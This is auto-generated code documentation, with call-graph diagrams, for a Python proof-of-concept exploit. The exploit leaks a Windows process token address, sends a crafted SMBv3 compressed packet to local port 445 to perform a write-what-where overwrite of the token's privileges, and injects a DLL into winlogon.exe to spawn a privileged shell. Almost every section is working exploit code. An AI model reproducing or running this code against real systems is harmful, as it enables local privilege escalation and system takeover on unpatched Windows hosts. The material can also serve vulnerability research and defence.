# Key Objects

[_Documentation generated by Documatic_](https://www.documatic.com)

<!---Documatic-section-poc.get_token_address-start--->
## poc.get_token_address

<!---Documatic-section-get_token_address-start--->
```mermaid
flowchart LR
poc.get_token_address-->poc.find_handles
```

### Object Calls

* poc.find_handles

<!---Documatic-block-poc.get_token_address-start--->
<details>
	<summary><code>poc.get_token_address</code> code snippet</summary>

```python
def get_token_address():
    hProc = HANDLE(kernel32.GetCurrentProcess())
    pid = kernel32.GetCurrentProcessId()
    print('[+] Current PID: ' + str(pid))
    h = HANDLE()
    res = OpenProcessToken(hProc, TOKEN_QUERY, byref(h))
    if res == 0:
        print('[-] Error getting token handle: ' + str(kernel32.GetLastError()))
    else:
        print('[+] Token Handle: ' + str(h.value))
    q = STATUS_INFO_LENGTH_MISMATCH
    out = DWORD(0)
    sz = 0
    while q == STATUS_INFO_LENGTH_MISMATCH:
        sz += 4096
        handle_info = (c_ubyte * sz)()
        q = ntdll.NtQuerySystemInformation(SystemExtendedHandleInformation, byref(handle_info), sz, byref(out))
    handles = find_handles(pid, handle_info)
    hToken = list(filter(lambda x: x[0] == pid and x[2] == h.value, handles))
    if len(hToken) != 1:
        print('[-] Could not find access token address!')
        return None
    else:
        pToken = hToken[0][1]
        print('[+] Found token at ' + hex(pToken))
    return pToken
```
</details>
<!---Documatic-block-poc.get_token_address-end--->
<!---Documatic-section-get_token_address-end--->

# #
<!---Documatic-section-poc.get_token_address-end--->

<!---Documatic-section-write_what_where.send_negotiation-start--->
## write_what_where.send_negotiation

<!---Documatic-section-send_negotiation-start--->
```mermaid
flowchart LR
write_what_where.send_negotiation-->write_what_where.Smb2NegotiateRequest
write_what_where.send_negotiation-->write_what_where.NetBIOSWrapper
```

### Object Calls

* write_what_where.Smb2NegotiateRequest
* write_what_where.NetBIOSWrapper

<!---Documatic-block-write_what_where.send_negotiation-start--->
<details>
	<summary><code>write_what_where.send_negotiation</code> code snippet</summary>

```python
def send_negotiation(sock):
    negotiate = Smb2NegotiateRequest()
    packet = NetBIOSWrapper(negotiate.get_packet()).get_packet()
    sock.send(packet.encode('latin1'))
    sock.recv(3000)
```
</details>
<!---Documatic-block-write_what_where.send_negotiation-end--->
<!---Documatic-section-send_negotiation-end--->

# #
<!---Documatic-section-write_what_where.send_negotiation-end--->

<!---Documatic-section-write_what_where.compress-start--->
## write_what_where.compress

<!---Documatic-section-compress-start--->
<!---Documatic-block-write_what_where.compress-start--->
<details>
	<summary><code>write_what_where.compress</code> code snippet</summary>

```python
def compress(buffer_in):
    COMPRESSION_FORMAT_LZNT1 = 2
    COMPRESSION_FORMAT_XPRESS = 3
    COMPRESSION_FORMAT_XPRESS_HUFF = 4
    COMPRESSION_ENGINE_STANDARD = 0
    COMPRESSION_ENGINE_MAXIMUM = 256
    RtlCompressBuffer = ctypes.windll.ntdll.RtlCompressBuffer
    RtlGetCompressionWorkSpaceSize = ctypes.windll.ntdll.RtlGetCompressionWorkSpaceSize
    fmt_engine = COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD
    workspace_size = ctypes.c_ulong(0)
    workspace_fragment_size = ctypes.c_ulong(0)
    res = RtlGetCompressionWorkSpaceSize(ctypes.c_ushort(fmt_engine), ctypes.pointer(workspace_size), ctypes.pointer(workspace_fragment_size))
    assert res == 0, 'RtlGetCompressionWorkSpaceSize failed.'
    workspace = ctypes.c_buffer(workspace_size.value)
    buffer_out = ctypes.c_buffer(1024 + len(buffer_in) + len(buffer_in) // 10)
    compressed_size = ctypes.c_ulong(0)
    res = RtlCompressBuffer(ctypes.c_ushort(fmt_engine), buffer_in, len(buffer_in), buffer_out, len(buffer_out), ctypes.c_ulong(4096), ctypes.pointer(compressed_size), workspace)
    assert res == 0, 'RtlCompressBuffer failed.'
    return buffer_out.raw[:compressed_size.value]
```
</details>
<!---Documatic-block-write_what_where.compress-end--->
<!---Documatic-section-compress-end--->

# #
<!---Documatic-section-write_what_where.compress-end--->

<!---Documatic-section-poc.exploit-start--->
## poc.exploit

<!---Documatic-section-exploit-start--->
```mermaid
flowchart LR
poc.exploit-->poc.get_token_address
poc.get_token_address-->poc.find_handles
poc.exploit-->write_what_where.write_what_where
write_what_where.write_what_where-->write_what_where.send_negotiation
write_what_where.send_negotiation-->write_what_where.Smb2NegotiateRequest
write_what_where.send_negotiation-->write_what_where.NetBIOSWrapper
write_what_where.write_what_where-->write_what_where.compress
write_what_where.write_what_where-->write_what_where.send_compressed
write_what_where.send_compressed-->write_what_where.Smb2CompressedTransformHeader
write_what_where.send_compressed-->write_what_where.NetBIOSWrapper
```

### Object Calls

* poc.get_token_address
* write_what_where.write_what_where

<!---Documatic-block-poc.exploit-start--->
<details>
	<summary><code>poc.exploit</code> code snippet</summary>

```python
def exploit():
    token = get_token_address()
    if token is None:
        sys.exit(-1)
    what = b'\xff' * 8 * 3
    where = token + 64
    print('[+] Writing full privileges on address %x' % where)
    write_what_where('127.0.0.1', what, where)
    print('[+] All done! Spawning a privileged shell.')
    print('[+] Check your privileges: !token %x' % token)
    dll_path = pathlib.Path(__file__).parent.absolute().joinpath('spawn_cmd.dll')
    subprocess.call(['Injector.exe', '--process-name', 'winlogon.exe', '--inject', dll_path], stdout=open(os.devnull, 'wb'))
```
</details>
<!---Documatic-block-poc.exploit-end--->
<!---Documatic-section-exploit-end--->

# #
<!---Documatic-section-poc.exploit-end--->

<!---Documatic-section-poc.find_handles-start--->
## poc.find_handles

<!---Documatic-section-find_handles-start--->
<!---Documatic-block-poc.find_handles-start--->
<details>
	<summary><code>poc.find_handles</code> code snippet</summary>

```python
def find_handles(pid, data):
    header = cast(data, POINTER(SYSTEM_HANDLE_INFORMATION_EX))
    nentries = header[0].NumberOfHandles
    print('[+] Leaking access token address')
    handles = []
    data = bytearray(data[16:])
    while nentries > 0:
        p = data[:40]
        e = struct.unpack('<QQQLHHLL', p)
        nentries -= 1
        data = data[40:]
        hpid = e[1]
        handle = e[2]
        if hpid != pid:
            continue
        handles.append((e[1], e[0], e[2]))
    return handles
```
</details>
<!---Documatic-block-poc.find_handles-end--->
<!---Documatic-section-find_handles-end--->

# #
<!---Documatic-section-poc.find_handles-end--->

<!---Documatic-section-write_what_where.send_compressed-start--->
## write_what_where.send_compressed

<!---Documatic-section-send_compressed-start--->
```mermaid
flowchart LR
write_what_where.send_compressed-->write_what_where.Smb2CompressedTransformHeader
write_what_where.send_compressed-->write_what_where.NetBIOSWrapper
```

### Object Calls

* write_what_where.Smb2CompressedTransformHeader
* write_what_where.NetBIOSWrapper

<!---Documatic-block-write_what_where.send_compressed-start--->
<details>
	<summary><code>write_what_where.send_compressed</code> code snippet</summary>

```python
def send_compressed(sock, raw_data, compressed_data):
    compressed = Smb2CompressedTransformHeader(raw_data, compressed_data)
    packet = NetBIOSWrapper(compressed.get_packet()).get_packet()
    sock.send(packet.encode('latin1'))
    try:
        sock.recv(1000)
    except ConnectionResetError:
        pass
```
</details>
<!---Documatic-block-write_what_where.send_compressed-end--->
<!---Documatic-section-send_compressed-end--->

# #
<!---Documatic-section-write_what_where.send_compressed-end--->

<!---Documatic-section-write_what_where.write_what_where-start--->
## write_what_where.write_what_where

<!---Documatic-section-write_what_where-start--->
```mermaid
flowchart LR
write_what_where.write_what_where-->write_what_where.send_negotiation
write_what_where.send_negotiation-->write_what_where.Smb2NegotiateRequest
write_what_where.send_negotiation-->write_what_where.NetBIOSWrapper
write_what_where.write_what_where-->write_what_where.compress
write_what_where.write_what_where-->write_what_where.send_compressed
write_what_where.send_compressed-->write_what_where.Smb2CompressedTransformHeader
write_what_where.send_compressed-->write_what_where.NetBIOSWrapper
```

### Object Calls

* write_what_where.send_negotiation
* write_what_where.compress
* write_what_where.send_compressed

<!---Documatic-block-write_what_where.write_what_where-start--->
<details>
	<summary><code>write_what_where.write_what_where</code> code snippet</summary>

```python
def write_what_where(ip_address, what, where):
    sock = socket.socket(socket.AF_INET)
    sock.settimeout(3)
    sock.connect((ip_address, 445))
    send_negotiation(sock)
    data_to_compress = os.urandom(4352 - len(what))
    data_to_compress += b'\x00' * 24
    data_to_compress += struct.pack('<Q', where)
    raw_data = what
    compressed_data = compress(data_to_compress)
    send_compressed(sock, raw_data, compressed_data)
```
</details>
<!---Documatic-block-write_what_where.write_what_where-end--->
<!---Documatic-section-write_what_where-end--->

# #
<!---Documatic-section-write_what_where.write_what_where-end--->

[_Documentation generated by Documatic_](https://www.documatic.com)